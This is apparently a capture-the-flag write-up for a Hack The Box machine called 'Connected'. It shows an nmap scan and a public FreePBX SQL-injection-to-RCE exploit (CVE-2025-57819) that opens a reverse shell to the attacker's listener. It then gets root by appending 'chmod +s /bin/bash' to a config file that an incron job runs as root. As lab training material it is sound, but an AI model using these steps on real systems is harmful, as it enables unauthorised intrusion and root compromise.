
### Initial access
Nmap
```
PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZBL8VwwAo5nMO8NKi+tOD98pIamOTde7sVlAJmP1Lp5urgs8hzvYIVElaEWZdxjHZM5hggtGg8Tmqzn2tOeNsN3rh/JTcXCjtc2izUuwLb18s5GgMHkBooT6UBCdcztPySFILnedHcFusfxSPTVTSIrwGaxLKULJ/qn2ClQ6BBp60NqQg0Da93fbm/5NS6OtZYdWdfcW4oyN/LWQcfFo/OYFjzWng+1pU+gfeuWic4iW2eg9qmWq43Och4oNJ3VAYh8MpXaKuoaDi+J7R6f60ADTQ6Kg/oSHKj8RV0zySax8qHt+Q2987wcdXuCnI+6oREQIUHu1s3z+rmnT2k4Mx
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH4ZlpWhdGD2bgi63EUvvzRx/sv8EvmVBLOFPVarhdPQcqCL69SyCtU0JLlNqdLxKGUbh5t1/9BvGU7+cXZdt1E=
|   256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5pB+WpL08kZ9YCgPA7QRnKjCsHY/R9oNeUQF1LD5Ms
80/tcp  open  http     syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-title: Did not follow redirect to http://connected.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
443/tcp open  ssl/http syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/localityName=SomeCity/emailAddress=root@pbxconnect/organizationalUnitName=SomeOrganizationalUnit
| Issuer: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/localityName=SomeCity/emailAddress=root@pbxconnect/organizationalUnitName=SomeOrganizationalUnit
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-30T14:07:27
| Not valid after:  2026-11-30T14:07:27
| MD5:     2530 86e8 e962 6d48 36f8 e524 bf79 cc5a
| SHA-1:   6997 e786 d78e 2d0a dcb4 f449 7f65 ba12 52ef 0466
| SHA-256: 46b9 6671 74f5 9939 af02 a812 993c a389 bf84 c67a de5e 94b1 6c01 43d3 fac9 b666
| -----BEGIN CERTIFICATE-----
| MIID4jCCAsqgAwIBAgICAOgwDQYJKoZIhvcNAQELBQAwgaUxCzAJBgNVBAYTAi0t
| MRIwEAYDVQQIDAlTb21lU3RhdGUxETAPBgNVBAcMCFNvbWVDaXR5MRkwFwYDVQQK
| DBBTb21lT3JnYW5pemF0aW9uMR8wHQYDVQQLDBZTb21lT3JnYW5pemF0aW9uYWxV
| bml0MRMwEQYDVQQDDApwYnhjb25uZWN0MR4wHAYJKoZIhvcNAQkBFg9yb290QHBi
| eGNvbm5lY3QwHhcNMjUxMTMwMTQwNzI3WhcNMjYxMTMwMTQwNzI3WjCBpTELMAkG
| A1UEBhMCLS0xEjAQBgNVBAgMCVNvbWVTdGF0ZTERMA8GA1UEBwwIU29tZUNpdHkx
| GTAXBgNVBAoMEFNvbWVPcmdhbml6YXRpb24xHzAdBgNVBAsMFlNvbWVPcmdhbml6
| YXRpb25hbFVuaXQxEzARBgNVBAMMCnBieGNvbm5lY3QxHjAcBgkqhkiG9w0BCQEW
| D3Jvb3RAcGJ4Y29ubmVjdDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
| ALHeypjH6abbs3T5INa8PZP8w90Xjj0PJ68myliRayEhZKmQL/FbL+9XLIaRGxMI
| 3fXLvn0Sw2AfDWWpkFEMckSokGZK2MTp4CYooo4DvNIiggms4xZ2aLY35zsU45II
| EzVB6OAtd8imI6h/D/YEaOvFQFPtXb9gzB0edJP55gjkCIYAt95oLAZLbUa5u0r9
| OhjBPuqVQE0f6oqsZh/1UnZcsscDw51r7jKGx2+uSpVb6dxMM9y2XX/XC26g4VbA
| noHrbagpbisbDwGIhQU19znUT2iYVpNBV3I9ehiVB7FFC7+cT8LIgpJ+KtXM/cjg
| dsxJ+sVzuB02MCS6ly0PbjMCAwEAAaMaMBgwCQYDVR0TBAIwADALBgNVHQ8EBAMC
| BeAwDQYJKoZIhvcNAQELBQADggEBAHdARF+ZdnUhYCaB5lowDM1sxWS9F8kkECOh
| 3D/d/LeJ7c6RRR0Ktmw6/4zRCW1bDUkjtdz4idYRYGyivkYobhX3NvhV5ghslMw3
| UDjGexJToW7Qk5YNSIeKkfR89Tg2DkJzlUs4b1DT+ZaGgCto7x8mrzXcT0ktDyK1
| nHqmiKXuVFtwLpnJxXArPkhiH7TYgGaeUZw8U6z7EUBtgnn8BESAB+LQ2n4OQnbE
| lJS2230sbxaxiOpt83EN97CnusGePjqpiUXxPJVc0LA5U7mZiqhojAFWRSOMax7l
| yzYI6PipGEKHexXmy4DTfm/n0xR4HRITygOgW28l6qiXtAME9hw=
|_-----END CERTIFICATE-----
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_ssl-date: TLS randomness does not represent time
|_http-title: 400 Bad Request

```

After recon we use this to intial access https://www.exploit-db.com/exploits/52681
```bash
┌──(kali㉿kali)-[~/HTB/Connected]
└─$ python3 exp.py -u http://connected.htb --lhost 10.10.17.47 --lport 4444
CVE-2025-57819 • FreePBX Unauth SQLi → RCE
Coded By: K3ysTr0K3R (Jared Brits)
Need a hug? ʕっ•ᴥ•ʔっ

[*] Target locked: http://connected.htb
[*] Reverse listener armed on 10.10.17.47:4444, awaiting callback...
[+] Exploit path confirmed!
[*] Injecting payload into cron schedule...
[+] Payload planted successfully (server response: 500)
[*] Awaiting trigger activation (cron will fire within ~60 seconds)...
[*] Backdoor callback expected from 10.10.17.47:4444 in the next 60–90 seconds...
...
....
.....

bash: no job control in this shell
______                   ______ ______ __   __
|  ___|                  | ___ \| ___ \\ \ / /
| |_    _ __   ___   ___ | |_/ /| |_/ / \ V / 
|  _|  | '__| / _ \ / _ \|  __/ | ___ \ /   \ 
| |    | |   |  __/|  __/| |    | |_/ // /^\ \
\_|    |_|    \___| \___|\_|    \____/ \/   \/
                                              
                                              
NOTICE! You have 3 notifications! Please log into the UI to see them!
Current Network Configuration
+-----------+-------------------+---------------------------+
| Interface | MAC Address       | IP Addresses              |
+-----------+-------------------+---------------------------+
| eth0      | 00:50:56:B9:A3:99 | 10.129.37.108             |
|           |                   | fe80::82bd:1bcb:a990:dd3b |
+-----------+-------------------+---------------------------+


[asterisk@connected ~]$ id
id
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
[asterisk@connected ~]$ 


```

### Priv escalation
We have gcc which make me think kernel exploit but it cant it the misconfig of `/etc/dahdi/init.conf` alow us to write in to and the incronrun when file is modify.


`incrond` is watching **`/var/spool/asterisk/sysadmin/dahdi_restart`**.

Your rule says:

```
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
```

Meaning:

- **Watched file:** `/var/spool/asterisk/sysadmin/dahdi_restart`
- **Event:** `IN_CLOSE_WRITE` — a file is opened for writing and then closed
- **Action:** `/usr/sbin/sysadmin_dahdi_restart`



```bash
[asterisk@connected ~]$ clear
[asterisk@connected ~]$ cat /etc/incron.d/*
/var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
/var/spool/asterisk/sysadmin/portmgmt_setup IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
/var/spool/asterisk/sysadmin/wanrouter_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#

/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#

```
Recon
```
2026/09/10 09:28:01 CMD: UID=0    PID=1294   | /bin/sh /usr/sbin/safe_asterisk
```
Check timer of cronjobs
```
watch -n 1 'systemctl list-timers'
```

Exploit we know the logic just modify the  `/var/spool/asterisk/sysadmin/dahdi_restart`
and we get root shell. This machine using incron despite cron so we cant use  pspy must recon 
```
[asterisk@connected ~]$ echo "chmod +s /bin/bash" >> /etc/dahdi/init.conf
[asterisk@connected ~]$ nano /var/spool/asterisk/sysadmin/dahdi_restart
[asterisk@connected ~]$ ls -la /bin/bash
-rwsr-sr-x. 1 root root 964536 Apr  1  2020 /bin/bash

[asterisk@connected ~]$ bash -p
bash-4.2# id
uid=999(asterisk) gid=1000(asterisk) euid=0(root) egid=0(root) groups=0(root),1000(asterisk)
bash-4.2# cat /root/root.txt
fc9b099c80e0076ab694bc3dd698e113
bash-4.2# 


```